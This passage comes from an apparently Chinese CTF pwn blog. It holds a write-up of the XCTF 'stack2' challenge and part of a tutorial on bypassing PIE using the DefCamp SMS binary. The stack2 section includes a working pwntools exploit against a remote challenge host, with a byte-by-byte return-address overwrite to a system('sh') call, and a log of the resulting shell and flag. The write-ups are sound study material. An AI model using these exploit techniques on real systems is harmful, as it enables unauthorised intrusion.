punctuation">(</span><span class="token string">"id\t\tnumber"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> j<span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\t\t%d\n"</span><span class="token punctuation">,</span> k<span class="token punctuation">,</span> v13<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">3</span> <span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"which number to change:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"new number:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>      v13<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">4</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    v9 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> l <span class="token operator">&lt;</span> j<span class="token punctuation">;</span> <span class="token operator">++</span>l <span class="token punctuation">)</span>      v9 <span class="token operator">+</span><span class="token operator">=</span> v13<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>关键段：</strong></p><pre class=" language-c"><code class="language-c">      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"which number to change:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"new number:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>      v13<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span></code></pre><h2 id="3：漏洞"><a href="#3：漏洞" class="headerlink" title="3：漏洞"></a>3：漏洞</h2><p><strong>整个代码比较长，但有用的就那么一两个。</strong>关键段代码实现更改数字的功能，v13数组大小是100，<strong>但在这里并没有看到限制了目标位置的输入大小，即：which number to change: 。</strong>而通过伪代码发现v13位于[ebp-70h]所以如果我第一次输入的数字比较大，就可以通过第二次输入来更改高地址栈空间。<br>那么接下来主要就是计算v13到返回地址的长度。</p><p>一开始我认为是这样的：<br><img src="https://s1.ax1x.com/2020/07/15/U0ZMKP.png" alt=""><br>那么只要0x70+4 =116个padding就可以了但是怎么都没有成功跳转，我调试发现原来，这个程序的栈没有这么理想：<br><img src="https://s1.ax1x.com/2020/07/15/U0Zlb8.png" alt=""><br>刚开始是这个样子，返回地址__libc_start_main+241已经在栈中了，可以理解为main函数也是被调用的（call）先压入返回地址再跳转执行函数</p><p>执行完main+7：<br><img src="https://s1.ax1x.com/2020/07/15/U0ZQDf.png" alt=""><br>发现上面那个push指令又将这个返回地址压入栈中，那么哪一个才是真的返回地址？那肯定遵循调用函数（call）的说法：<strong>先将返回地址压入栈中，再跳转执行函数，所以一开始压入的才是函数真正的返回地址。</strong><br>我们可以看到马上要执行push  ebp，所以返回地址离ebp有16个字节的距离。这个从栈中可以看出，也可以从一个作恶多端的汇编指令中得出：发现了<strong>0x80485d4 &lt;main+4&gt;:    and    esp,0xfffffff0</strong>  这句话吗？<br>没错是用来平衡堆栈的，与运算。将esp最后一个16进制数归零。我们去看一下当时esp是多少：<br><img src="https://s1.ax1x.com/2020/07/15/U0Z3VS.png" alt=""><br>可以看到是0xffffd02c  那么执行后就是0xffffd0c0 少了12个字节，所以栈中正确的样子是：<br><img src="https://s1.ax1x.com/2020/07/15/U0Zuvt.png" alt=""><br>所以需要的padding是：0x70+8+16 = 132.（可以自己随便输入某个数字来验证是否改变了返回地址）</p><h2 id="4：EXP"><a href="#4：EXP" class="headerlink" title="4：EXP"></a>4：EXP</h2><p><strong>在v13[v5] = v7;这条指令中 v7是int型v13是char型只占用一个字节（在赋值过程会转型），很适合payload来以字节大小填充。也就是说我们执行这条指令是以一个字节一个字节形式进行数据覆盖（16进制的两个数字）。</strong><br>通过IDA看到后门地址0x804859b 可以执行system(“/bin/bash”).因为每利用一次漏洞只能覆盖两个16进制数，所以要多次运行change numbers 选项。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true">#sh =process('./stack2')</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'220.249.52.133'</span><span class="token punctuation">,</span><span class="token number">32607</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0804859B 后门</span><span class="token comment" spellcheck="true">#0x8048450 system</span><span class="token comment" spellcheck="true">#0x08048987 : sh</span><span class="token comment" spellcheck="true">#addr = [0x9b,0x85,0x04,0x08]               #原本我可以直接用后门地址，填充四次就可以了.这个本地没问题，但在打开端口后因为环境中只有sh这个指令所以会失败</span>addr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token number">0x84</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span><span class="token number">0x08</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x85</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span><span class="token number">0x08</span><span class="token punctuation">,</span><span class="token number">0x87</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span><span class="token number">0x08</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">#这个是来应对环境中只有sh命令，用gdb找到system函数地址，ROPgadgate找到sh字符串地址</span>                                                                        <span class="token comment" spellcheck="true">#在栈上构造了一个system("/sh")</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token number">132</span>                     <span class="token comment" spellcheck="true">#通过计算从132开始覆盖（记得小端序）由于addr的变动覆盖12次</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#pwntools发送的都是str类型</span>    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    flag <span class="token operator">+=</span> <span class="token number">1</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>addr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>这个虽然开了banary但是和他感觉没啥关系</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x46 bytes:    <span class="token string">'1. show numbers\n'</span>    <span class="token string">'2. add number\n'</span>    <span class="token string">'3. change number\n'</span>    <span class="token string">'4. get average\n'</span>    <span class="token string">'5. exit\n'</span>1. show numbers2. add number3. change number4. get average5. <span class="token keyword">exit</span>$ <span class="token function">ls</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0x3 bytes:    <span class="token string">'ls\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x24 bytes:    <span class="token string">'bin\n'</span>    <span class="token string">'dev\n'</span>    <span class="token string">'flag\n'</span>    <span class="token string">'lib\n'</span>    <span class="token string">'lib32\n'</span>    <span class="token string">'lib64\n'</span>    <span class="token string">'stack2\n'</span>bindevflagliblib32lib64stack2$ <span class="token function">cat</span> flag<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0x9 bytes:    <span class="token string">'cat flag\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x2d bytes:    <span class="token string">'cyberpeace{b39d4c717df76e74117613fc8e3a89d5}\n'</span>cyberpeace<span class="token punctuation">{</span>b39d4c717df76e74117613fc8e3a89d5<span class="token punctuation">}</span>$  </code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-challenge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PIE绕过</title>
      <link href="/2020/07/14/pie-rao-guo/"/>
      <url>/2020/07/14/pie-rao-guo/</url>
      
        <content type="html"><![CDATA[<h2 id="1：ASLR简单介绍"><a href="#1：ASLR简单介绍" class="headerlink" title="1：ASLR简单介绍"></a>1：ASLR简单介绍</h2><p>ASLR（地址随机化）是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。<strong>可以理解为libc、栈、堆的加载位置被随机化。并没有对所有模块和内存区都进行随机化</strong></p><h2 id="2：PIE"><a href="#2：PIE" class="headerlink" title="2：PIE"></a>2：PIE</h2><p>PIE(position-independent executable, 地址无关可执行文件)技术就是一个针对<strong>代码段.text, 数据段.*data，.bss等固定地址</strong>的一个防护技术弥补了ASLR的不足。同ASLR一样，应用了PIE的程序会在每次加载时都变换加载基址，从而使位于程序本身的gadget（代码区）也失效。</p><p>没有PIE保护的程序，每次加载的基址都是固定的</p><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN$ checksec  h2<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/h2'</span>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span></code></pre><p>64位基地址：0x400000</p><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN$ checksec level1<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/level1'</span>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>    RWX:      Has RWX segments</code></pre><p>32位基地址：0x8048000</p><h3 id="开启PIE"><a href="#开启PIE" class="headerlink" title="开启PIE"></a>开启PIE</h3><p>第一次：</p><pre class=" language-bash"><code class="language-bash">   0x562ddaa35a72:    mov    esi,0x80   0x562ddaa35a77:    mov    rdi,rax   0x562ddaa35a7a:    call   0x562ddaa357b0<span class="token operator">=</span><span class="token operator">></span> 0x562ddaa35a7f:    mov    DWORD PTR <span class="token punctuation">[</span>rbp-0x4<span class="token punctuation">]</span>,0x0   0x562ddaa35a86:    jmp    0x562ddaa35aac   0x562ddaa35a88:    mov    eax,DWORD PTR <span class="token punctuation">[</span>rbp-0x4<span class="token punctuation">]</span>   0x562ddaa35a8b:    cdqe      0x562ddaa35a8d:    movzx  ecx,BYTE PTR <span class="token punctuation">[</span>rbp+rax*1-0x90<span class="token punctuation">]</span></code></pre><p>第二次：</p><pre class=" language-bash"><code class="language-bash">   0x5610c0b62a72:    mov    esi,0x80   0x5610c0b62a77:    mov    rdi,rax   0x5610c0b62a7a:    call   0x5610c0b627b0<span class="token operator">=</span><span class="token operator">></span> 0x5610c0b62a7f:    mov    DWORD PTR <span class="token punctuation">[</span>rbp-0x4<span class="token punctuation">]</span>,0x0   0x5610c0b62a86:    jmp    0x5610c0b62aac   0x5610c0b62a88:    mov    eax,DWORD PTR <span class="token punctuation">[</span>rbp-0x4<span class="token punctuation">]</span>   0x5610c0b62a8b:    cdqe      0x5610c0b62a8d:    movzx  ecx,BYTE PTR <span class="token punctuation">[</span>rbp+rax*1-0x90<span class="token punctuation">]</span></code></pre><p>可以看到两次加载的基址是不一样的。<br>显然，PIE的应用给ROP技术造成了很大的影响。但是由于某些系统和缺陷，其他漏洞的存在和地址随机化本身的问题，方法还是有的。</p><h2 id="3：partial-write-bypass-PIE"><a href="#3：partial-write-bypass-PIE" class="headerlink" title="3：partial write bypass PIE"></a>3：partial write bypass PIE</h2><p>partial write(部分写入)就是一种利用了PIE技术缺陷的bypass技术。由于内存的页载入机制，PIE的随机化只能影响到单个内存页。通常来说，一个内存页大小为0x1000，这就意味着不管地址怎么变，<strong>某条指令的后12位，3个十六进制数的地址是始终不变的。因此我们找到目标地址的后三个十六进制数，然后想办法将返回地址（被压入的ip）后三个十六进制数覆盖成目标地址，从而达到劫持程序流程的目的</strong></p><h2 id="4：实操"><a href="#4：实操" class="headerlink" title="4：实操"></a>4：实操</h2><p>程序是DefCamp CTF Finals 2016: SMS (pwn 200)</p><h3 id="1：checksec"><a href="#1：checksec" class="headerlink" title="1：checksec"></a>1：checksec</h3><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/PIE$ checksec sms<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/PIE/sms'</span>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      PIE enabled</code></pre><h3 id="2：IDA"><a href="#2：IDA" class="headerlink" title="2：IDA"></a>2：IDA</h3><pre class=" language-c"><code class="language-c">main函数：<span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">puts</span><span class="token punctuation">(</span>    <span class="token string">"--------------------------------------------\n"</span>    <span class="token string">"|   Welcome to Defcamp SMS service          |\n"</span>    <span class="token string">"--------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">dosms</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>dosms函数：<span class="token keyword">int</span> <span class="token function">dosms</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-C0h]     </span>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8Ch] [rbp-34h]</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+B4h] [rbp-Ch]</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v2<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">40uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    #将v2地址处清零  v3 <span class="token operator">=</span> <span class="token number">140</span><span class="token punctuation">;</span>  <span class="token function">set_user</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">set_sms</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"SMS delivered"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">set_user</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v1<span class="token punctuation">)</span>函数：<span class="token keyword">int</span> __fastcall <span class="token function">set_user</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">140</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-90h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+9Ch] [rbp-4h]</span>  <span class="token function">memset</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">128uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Enter your name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> _bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">40</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token number">140</span><span class="token punctuation">)</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hi, %s"</span><span class="token punctuation">,</span> a1 <span class="token operator">+</span> <span class="token number">140</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">set_sms</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v1<span class="token punctuation">)</span>函数：<span class="token keyword">char</span> <span class="token operator">*</span>__fastcall <span class="token function">set_sms</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-400h]</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1024uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"SMS our leader"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">,</span> _bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">strncpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">180</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>frontdoor函数：<span class="token keyword">int</span> <span class="token function">frontdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-80h]</span>  <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> _bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>那么可以看出程序大概是：先输出菜单，执行dosms函数。dosms中set_user获取名字，set_sms再次输入。我们要想办法控制程序执行frondoor这个后门。</p><h3 id="3：set-user-int64-amp-v1-函数"><a href="#3：set-user-int64-amp-v1-函数" class="headerlink" title="3：set_user((__int64)&amp;v1)函数"></a>3：set_user((__int64)&amp;v1)函数</h3><pre class=" language-c"><code class="language-c"><span class="token function">set_user</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v1<span class="token punctuation">)</span>函数：<span class="token keyword">int</span> __fastcall <span class="token function">set_user</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span>         #这个函数的参数是dosms函数中<span class="token keyword">char</span> v1的地址，在dosmsm函数中定义了<span class="token keyword">char</span> v1后，通过伪代码可知其位于<span class="token punctuation">[</span>rbp<span class="token operator">-</span>C0h<span class="token punctuation">]</span><span class="token punctuation">{</span>                                           #在这个函数<span class="token operator">&amp;</span>v1参数被写成a1（是个地址）  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">140</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-90h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+9Ch] [rbp-4h]</span>  <span class="token function">memset</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">128uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     #数组s，<span class="token number">128</span>字节大小范围清零  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Enter your name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> _bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>             #从标准输入流读取<span class="token number">128</span>个字符到s（地址），<span class="token number">128</span>如果太大就放入空字符  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">40</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>     #这个是s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>应该不会是<span class="token number">0</span>（大胆猜测），然后就会循环<span class="token number">41</span>次，将s，<span class="token number">0</span><span class="token operator">~</span><span class="token number">40</span>标号字符赋给a1（v1）地址处，从其<span class="token number">140</span>标号<span class="token operator">~</span><span class="token number">180</span>标号    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token number">140</span><span class="token punctuation">)</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hi, %s"</span><span class="token punctuation">,</span> a1 <span class="token operator">+</span> <span class="token number">140</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="4：set-sms-int64-amp-v1-函数"><a href="#4：set-sms-int64-amp-v1-函数" class="headerlink" title="4：set_sms((__int64)&amp;v1)函数"></a>4：set_sms((__int64)&amp;v1)函数</h3><p>fastcall是一种函数调用方式，在这里没啥用</p><pre class=" language-c"><code class="language-c"><span class="token function">set_sms</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v1<span class="token punctuation">)</span>函数：<span class="token keyword">char</span> <span class="token operator">*</span>__fastcall <span class="token function">set_sms</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span>               #一样，a1是dosms函数中v1的地址，作为该函数的参数，v1地址位于<span class="token punctuation">[</span>rbp<span class="token operator">-</span>C0h<span class="token punctuation">]</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-400h]</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1024uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      #数组s，<span class="token number">1024</span>字节清零  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"SMS our leader"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">,</span> _bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>                 #从标准输入流读取<span class="token number">1024</span>个字符到s地址  <span class="token keyword">return</span> <span class="token function">strncpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">180</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     #strncpy将从s地址处将其字符串赋值到a1（v1）地址，赋值的量得看第三个参数的大小<span class="token punctuation">}</span>                                                                #即a1（v1<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">180</span>地址存放的数值将决定 strncpy函数一次赋值字符串的多少</code></pre><p>那么显然如果strncpy可能存在溢出，只要a1（v1)+180地址处的数值比较大，就可以溢出a1（v1地址），v1其位于[rbp-C0h]。而rbp下面就是返回地址。<br><img src="https://s1.ax1x.com/2020/07/15/Ua624g.png" alt=""><br>*<em>所以得再v1地址开始覆盖：0xc0 + 8(rbp) 个字符 == 200 后面再覆盖返回地址即可控制程序 *</em></p><h3 id="5：综上"><a href="#5：综上" class="headerlink" 